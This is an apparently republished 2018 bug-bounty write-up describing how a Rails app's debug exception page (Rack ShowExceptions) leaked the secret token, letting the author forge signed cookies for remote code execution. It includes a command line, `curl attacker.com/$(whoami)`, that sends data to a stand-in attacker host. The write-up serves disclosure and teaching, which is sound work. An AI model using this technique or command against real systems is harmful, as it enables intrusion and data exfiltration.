---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-20_rce-due-to-showexceptions.md
original_filename: 2018-07-20_rce-due-to-showexceptions.md
title: RCE due to ShowExceptions
category: documents
detected_topics:
- command-injection
- mfa
- otp
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- command-injection
- mfa
- otp
- automation-abuse
- information-disclosure
language: en
raw_sha256: 5469552825c7bfae26d7e143c5d9a7ed2e34a9558ed95365c31170e52d30db3e
text_sha256: 98dffd8bd4de70f1287b0f1c3c38e2841110b5c5ecd254abd8a954d5fd6ea811
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# RCE due to ShowExceptions

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-20_rce-due-to-showexceptions.md
- Source Type: markdown
- Detected Topics: command-injection, mfa, otp, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `5469552825c7bfae26d7e143c5d9a7ed2e34a9558ed95365c31170e52d30db3e`
- Text SHA256: `98dffd8bd4de70f1287b0f1c3c38e2841110b5c5ecd254abd8a954d5fd6ea811`


## Content

---
title: "RCE due to ShowExceptions"
url: "https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions"
final_url: "https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions"
authors: ["Harsh Jaiswal (@rootxharsh)"]
bugs: ["RCE", "Information disclosure", "Debugging enabled"]
bounty: "5,000"
publication_date: "2018-07-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5797
---

Search this site

Embedded Files

Skip to main content

Skip to navigation

# RCE due to ShowExceptions

  

Hey guys, First of all a good news, I'm starting to blog my findings again, I have few posts ready just waiting for confirmation from companies to make them public.

## 

Getting Started

So a few days back i started testing a private BB program, I found a straightforward RCE on it. I choose'd to start hunting on the main web app i.e. [https://app.redacted.com](https://www.google.com/url?q=https%3A%2F%2Fapp.redacted.com&sa=D&sntz=1&usg=AOvVaw0ZLzVtZnhEU_xoBLt7DTRo), While going through i found an endpoint which downloads a CSV report via [redacted.redacted.com](https://www.google.com/url?q=https%3A%2F%2Fredacted.redacted.com&sa=D&sntz=1&usg=AOvVaw2-Ct74tn8Recxa38Vxl533) (In-scope asset). The filename and its content was defined in the request it self,

![](https://lh3.googleusercontent.com/sitesv/AA5AbUBlpkfRvPhVTRTAFCmQnBaQv7fert3cDngIk2-HENDoaVbq1vWKpBIx9GR0_PNTdZUzFAnl9UkWLPK4PshSpJH9uYFP-5C6ttb8mrXf7y6t10_1ud0OJBVcOVWgBYOh4X5nN2WsHTRucA-m5hasx2HFPTFTXI-k5JWOjwPXpU41LkPb7mHF3iC3zmuFb5q-HHPZoVnNuriG-UeDU1w=w1280)

## 

Something happened

I was fuzzing around parameters, When i passed %0d to file_name the server threw an exception, The exception thrown because [Rack's ShowExceptions](https://www.google.com/url?q=https%3A%2F%2Fwww.rubydoc.info%2Fgems%2Frack%2FRack%2FShowExceptions&sa=D&sntz=1&usg=AOvVaw21DEyZH6i4NxNfdOMyiuhD) was on.

![Rack ShowExceptions was on](https://lh3.googleusercontent.com/sitesv/AA5AbUCLNGFWq5X6iI7PsgRL_E5pOwIzNL3sD6ythUfDGiy-ROLEbZmFvFy4jo6bdldcggGQWkQQxKzofWJUJOHFw2CvCA4utKH9Apar4EHvdQ-bsI64ErgIwvM9t76sIV5HdTD_GTBO7N6YHJCLpnUnmqDcqoj66ttkDh9JrWmOu5pBRzJTB3vp1a2DYmVJ9Eb4zN53fYzeztZtbR62pag=w1280)

## 

It's more than something 

As the the Rack's page suggests, "Be careful when you use this on public-facing sites as it could reveal information helpful to attackers", This must not be turned on on production environment. Rails (up to v4.0.2 NOT SURE) had a Secret token in /config/initializers/secret_token.rb. This token is used to verify the integrity of signed cookies (Any cookie set by your rails application is signed using this token), From Rails 4.0.2 this token is kept as environment variable `action_dispact.secret_token`. The exceptions page also leaks or better say includes this too. This token can be used to get RCE ( [https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/](https://www.google.com/url?q=https%3A%2F%2Frobertheaton.com%2F2013%2F07%2F22%2Fhow-to-hack-a-rails-app-using-its-secret-token%2F&sa=D&sntz=1&usg=AOvVaw1sSXPmE1Rcwxm8SOtgKoYA) ) You can read about this on the given link to understand and know how this works. 

I quickly used the above code to generate a cookie to execute `curl attacker.com/$(whoami)` and got an request to attacker.com/app.

![](https://lh3.googleusercontent.com/sitesv/AA5AbUBDnpshQTSTaRluopIXzIVZxAcRU6tRrw1WeXlATND2im34vNSo-VjKTXMt9MtnAFXpjG0CkFQFrhdlY4YJadyJCYMbwFSlo9OqPclPOrD1S0_rvPdk3pthFqXiDOI5Ivm3eN7EHUJcX5O8j8xh7SSagUgKy9EJmBNZoEjdJTFdi_-hug624FD-0Ji13qEy7nJi2Wl9C0Wu-Ebhczc=w1280)

This RCE was applicable for both [https://app.redacted.com/](https://www.google.com/url?q=https%3A%2F%2Fapp.redacted.com%2F&sa=D&sntz=1&usg=AOvVaw19v1HFG0lPnIdQAsMWJuwg) and [https://redacted.redacted.com/](https://www.google.com/url?q=https%3A%2F%2Fredacted.redacted.com%2F&sa=D&sntz=1&usg=AOvVaw3m1Zyd9o0s0wNBtHZT3Ov3) because both shared same rails app. 

That's all folks :) Share/Retweet is much appreciated. Doubt? DM me at [@rootxharsh](https://www.google.com/url?q=https%3A%2F%2Ftwitter.com%2Frootxharsh&sa=D&sntz=1&usg=AOvVaw2kNzhJ_5p0JCcutvriOBaS)

## 

Timeline 

  * 16 July : Bug found and Reported
  * 16 July : Triaged 
  * 18 July : Fixed
  * 20 July : $5000 Rewarded

Google Sites

Report abuse

Page details

Page updated

Google Sites

Report abuse
